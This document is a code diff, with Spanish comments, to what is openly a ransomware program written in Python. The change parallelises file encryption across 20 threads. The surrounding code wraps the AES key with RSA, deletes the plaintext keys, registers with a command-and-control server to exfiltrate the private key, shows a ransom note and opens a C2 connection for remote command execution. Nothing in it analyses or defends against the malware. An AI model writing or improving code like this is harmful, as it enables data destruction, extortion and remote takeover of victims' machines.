@@ -8,6 +8,7 @@ import antianalysis
 import agent
 import note
 import sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 def resource_path(relative_path):
     try:
@@ -50,25 +51,28 @@ def encrypt_file(file, aes_key):
         print(f"Error cifrando {file}: {e}") 
 
 def encrypt_files():
-    #antianalysis.check_virtualization() # Comprobación anti-virtualización
+    #antianalysis.check_virtualization()  # Comprobación anti-virtualización
     files = find_files()  # Obtener lista de archivos a cifrar
     for file in files:
-        if file.endswith('.encrypted'): # Comprobación de ejecución anterior
-            sys.exit(0)  # Termina el programa con código de salida 0 (sin error)
+        if file.endswith('.encrypted'):  # Comprobación de ejecución anterior
+            sys.exit(0)  # Detener ejecución
     gen_keys.generate_aes_key()  # Generar clave simétrica
     aes_key = load_aes_key()  # Cargar la clave simétrica
-    for file in files: # Cifra cada archivo con la clave AES
-        encrypt_file(file, aes_key)
+    # Ejecuta el cifrado en múltiples hilos usando ThreadPoolExecutor
+    with ThreadPoolExecutor(max_workers = 20) as executor:
+        futures = [executor.submit(encrypt_file, file, aes_key) for file in files]
+        for future in as_completed(futures):
+            future.result()  # Espera la finalización 
     print("Archivos cifrados correctamente.")
-    gen_keys.generate_rsa_key() # Generar par de claves RSA
-    rsa_public_key = load_rsa_public_key() # Cargar clave pública RSA
+    gen_keys.generate_rsa_key()  # Generar par de claves RSA
+    rsa_public_key = load_rsa_public_key()  # Cargar clave pública RSA
     encrypt_aes_key(rsa_public_key, aes_key)  # Se cifra la clave AES con la clave pública RSA
     os.remove("aes_key.bin")  # Eliminar clave simétrica sin cifrar
     os.remove("rsa_public.pem")  # Eliminar clave pública RSA
     agent.register_agent()  # Registrar agente en C2, exfiltración de clave privada RSA
-    change_background() # Cambiar fondo de pantalla
-    note.show_note() # Mostrar nota de rescate personalizada en escritorio
-    agent.connect_to_c2_server() # Conexión con servidor C2 para ejecución remota de comandos
+    change_background()  # Cambiar fondo de pantalla
+    note.show_note()  # Mostrar nota de rescate personalizada en escritorio
+    agent.connect_to_socket_server()  # Conexión con servidor C2 para ejecución remota de comandos
 
 
 
